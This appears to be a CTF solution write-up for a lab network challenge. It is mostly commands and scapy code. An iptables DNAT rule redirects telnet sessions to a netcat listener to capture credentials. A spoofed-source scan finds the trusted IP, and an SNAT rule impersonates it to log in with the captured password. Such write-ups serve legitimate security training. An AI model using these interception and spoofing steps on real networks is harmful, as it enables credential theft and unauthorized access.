# SPOILER ALERT

This is just one possible way of solving this challenge.  

Note for CTF admins: It requires a custom docker bridge networking driver because docker doesn't play nice with IP spoofing (long story).  Please follow installation instructions here, or the docker networks probably won't start ("l2bridge" driver undefined).  

https://github.com/nategraf/l2bridge-driver

## Catch the credentials

### Attacker

Notice SYN's and RST's for telnet/23.  Let's give it something to connect to...

```bash
tcpdump -ni any
```

Look into using iptables for simple TCP connection redirection.  

```bash
man iptables
man iptables-extensions
/DNAT
```

Place our address translation rule and then watch the counter for how many packets hit the rule

```bash
iptables -t nat -A PREROUTING -s 172.22.1.14 -d 172.22.0.8  -p tcp --dport 23 -j DNAT --to-destination 172.22.0.254:8023
iptables -t nat -vnL
```

Yum, credentials.  Now how are we going to use them if the port is closed?

```bash
nc -lp 8023 >> captured.txt &
```

Sometimes the whole session doesn't come through, stopping after the telnet negotiation or the username.  Trying again worked for me, though you could also try more flags to netcat

```bash
nc -tlvp 8023 -o hexdump >> capture.txt &
```

## Find the known-good source IP

We'll need to find the right source IP, based on the hint in the email.  

```bash
scapy
```

A long-running issue I encountered at this point was in not scapy-ing properly.  I was using ```send()``` which is layer 3 rather than ```sendp()``` layer 2.  This meant that the interface I was specifying with iface= was being partially ignored, because the kernel still had to resolve the Ethernet headers, so it was using ARP, which was shooting out an interface determined by the routing table rather than the one I wanted where the actual target lived.  Anyway, if you're trying to swim against the routing table slap an Ethernet header on there and use ```sendp()``` like a real hacker.  

I also discovered a nice little feature of python lambda functions: they will automatically unpack tuples if you feed them multiple parameters.  Scapy likes to pass around tuples of related packets, like (answered, unanswered) and (sent, received), so that feature lets you unpack them in a nice readable way. 

Also ```srp()``` will only accept one answer per packet unless you specify ```multi=True```.  One answer is just fine for our purposes, but it was interesting to see the 3 SYN/ACK packets the server responds with as it tries to keep the connection alive.  

We're really just blasting these packets out asynchronously, not waiting at all between them, so some will get dropped.  Hence the ```retry=``` and ```timeout=``` arguments.  Alternatively we could delay 0.1 seconds between each packet with ```inter=0.1```.  

```python
pkts = [Ether()/IP(src=f'172.22.1.{x}', dst='172.22.0.8')/TCP(dport=23) for x in range(1,254)]
answered, unanswered = srp(pkts, iface='eth1', retry=3, timeout=5, multi=True)
success = answered.filter(lambda sent, recvd: 'R' not in recvd[TCP].flags)
success
success.show()
```

If you're not comfortable with fancy python format strings, list comprehensions, or lambda functions, it could also be done like this.  

```python
success = []
for x in range(1,254):
    pkt = Ether()/IP(src='172.22.1.'+str(x), dst='172.22.0.8')/TCP(dport=23)
    answered, unanswered = srp(pkt, iface='eth1', verbose=0)
    if len(answered) == 1:
        sent, recvd = answered[0]
        if 'R' not in recvd[TCP].flags:
            success.append(recvd)
    elif len(answered) > 1:
        print("You must have set multi=True in srp()", answered)
print(success)
```

At the end of the day, you just need a way to scan a particular IP:port combo with a bunch of spoofed source IPs, to find which one is allowed to connect.  Once you find it, it's time to create a full spoofed-source connection.  

## Be the good guys

If we try to connect via telnet to the target, our packets leave our device with the wrong source IP (our own, which will be rejected since it's not known-good).  We can use iptables to change that.  

```bash
man iptables
man iptables-extensions
/SNAT
```

Do we really need the ```-s``` filter for source IP?  Well, we're doing this in the ```POSTROUTING``` chain rather than the ```OUTPUT``` chain (which isn't allowed) so we would be affecting any traffic routed through this device, like maybe legitimate admin traffic that they would notice.  Probably a small risk, but we should understand the routing well enough to know which of our source IPs will be chosen.  And more precise filters == more warm fuzzies, no?

```bash
iptables -t nat -A POSTROUTING -s 172.22.0.254 -d 172.22.0.8  -p tcp --dport 23 -j SNAT --to-source 172.22.1.9
iptables -t nat -vnL
```

```bash
cat captured.txt
# user: monitor 
# pass: monitors_gonna_monit
telnet 172.22.0.8
```

### monitor@netadmin

```bash
whoami
ls
cat flag1.txt
```

Victory!  Now I need to build the next section...
